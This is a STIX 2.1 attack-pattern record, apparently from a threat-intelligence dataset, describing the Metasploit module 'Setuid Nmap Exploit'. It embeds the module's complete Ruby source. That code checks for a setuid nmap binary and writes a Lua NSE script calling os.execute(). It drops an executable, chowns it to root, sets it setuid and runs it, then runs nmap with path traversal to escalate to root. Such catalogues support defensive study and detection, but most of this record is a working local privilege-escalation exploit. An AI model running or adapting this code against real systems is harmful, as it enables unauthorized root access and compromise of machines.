{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--162524db-64be-4512-8822-8fff19bd9281",
    "created": "2024-08-14T17:14:31.653647Z",
    "modified": "2024-08-14T17:14:31.653652Z",
    "name": "Setuid Nmap Exploit",
    "description": " Nmap's man page mentions that \"Nmap should never be installed with special privileges (e.g. suid root) for security reasons..\" and specifically avoids making any of its binaries setuid during installation.  Nevertheless, administrators sometimes feel the need to do insecure things.  This module abuses a setuid nmap binary by writing out a lua nse script containing a call to os.execute().  Note that modern interpreters will refuse to run scripts on the command line when EUID != UID, so the cmd/unix/reverse_{perl,ruby payloads will most likely not work.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/unix/local/setuid_nmap.rb",
            "external_id": "setuid_nmap.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Local\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::EXE\n  include Msf::Post::File\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Setuid Nmap Exploit',\n        'Description' => %q{\n          Nmap's man page mentions that \"Nmap should never be installed with\n          special privileges (e.g. suid root) for security reasons..\" and\n          specifically avoids making any of its binaries setuid during\n          installation.  Nevertheless, administrators sometimes feel the need\n          to do insecure things.  This module abuses a setuid nmap binary by\n          writing out a lua nse script containing a call to os.execute().\n\n          Note that modern interpreters will refuse to run scripts on the\n          command line when EUID != UID, so the cmd/unix/reverse_{perl,ruby}\n          payloads will most likely not work.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [ 'egypt' ],\n        'DisclosureDate' => '2012-07-19',\n        'Platform' => %w[bsd linux unix],\n        'Arch' => [ ARCH_CMD, ARCH_X86 ],\n        'SessionTypes' => [ 'shell', 'meterpreter' ],\n        'Targets' => [\n          [ 'Command payload', { 'Arch' => ARCH_CMD } ],\n          [ 'Linux x86', { 'Arch' => ARCH_X86 } ],\n          [ 'BSD x86', { 'Arch' => ARCH_X86 } ],\n        ],\n        'DefaultOptions' => { 'PrependSetresuid' => true, 'WfsDelay' => 2 },\n        'Notes' => {\n          'Reliability' => [ REPEATABLE_SESSION ],\n          'Stability' => [ CRASH_SAFE ],\n          'SideEffects' => [ ARTIFACTS_ON_DISK ]\n        },\n        'DefaultTarget' => 0\n      )\n    )\n    register_options([\n      # These are not OptPath becuase it's a *remote* path\n      OptString.new('Nmap', [ true, 'Path to setuid nmap executable', '/usr/bin/nmap' ]),\n      OptString.new('ExtraArgs', [ false, 'Extra arguments to pass to Nmap (e.g. --datadir)', '' ]),\n    ])\n    register_advanced_options [\n      OptString.new('WritableDir', [true, 'A directory where we can write files', '/tmp'])\n    ]\n  end\n\n  def nmap\n    datastore['Nmap']\n  end\n\n  def check\n    return CheckCode::Safe(\"#{nmap} file not found\") unless file? nmap\n    return CheckCode::Safe(\"#{nmap} is not setuid\") unless setuid? nmap\n\n    CheckCode::Vulnerable(\"#{nmap} is setuid\")\n  end\n\n  def exploit\n    if (target.arch.include? ARCH_CMD)\n      p = payload.encoded.gsub(/([$\"])/) { |_m| \"\\\\#{Regexp.last_match(1)}\" }\n      evil_lua = %{ os.execute(\"#{p} &\") }\n    else\n      exe_file = \"#{datastore['WritableDir']}/#{rand_text_alpha(8)}.elf\"\n      print_status(\"Dropping executable #{exe_file}\")\n      write_file(exe_file, generate_payload_exe)\n      evil_lua = %{\n        os.execute(\"chown root:root #{exe_file}\");\n        os.execute(\"chmod 6700 #{exe_file}\");\n        os.execute(\"#{exe_file} &\");\n        os.execute(\"rm -f #{exe_file}\");\n      }\n    end\n    lua_file = \"#{datastore['WritableDir']}/#{rand_text_alpha(8)}.nse\"\n    print_status(\"Dropping lua #{lua_file}\")\n    write_file(lua_file, evil_lua)\n\n    print_status(\"Running #{lua_file} with Nmap\")\n\n    scriptname = lua_file\n    if (lua_file[0, 1] == '/')\n      # Versions before 4.51BETA (December 2007) only accept relative paths for script names\n      # Figure 10 up-directory traversals is enough.\n      scriptname = ('../' * 10) + lua_file[1..]\n    end\n\n    begin\n      # Versions before 4.75 (August 2008) will not run scripts without a port scan\n      result = cmd_exec \"#{nmap} --script #{scriptname} -p80 localhost #{datastore['ExtraArgs']}\"\n      vprint_status(result)\n    ensure\n      rm_f(lua_file, exe_file)\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2012-07-19",
    "x_mitre_platforms": [
        "%w[bsd linux unix]"
    ]
}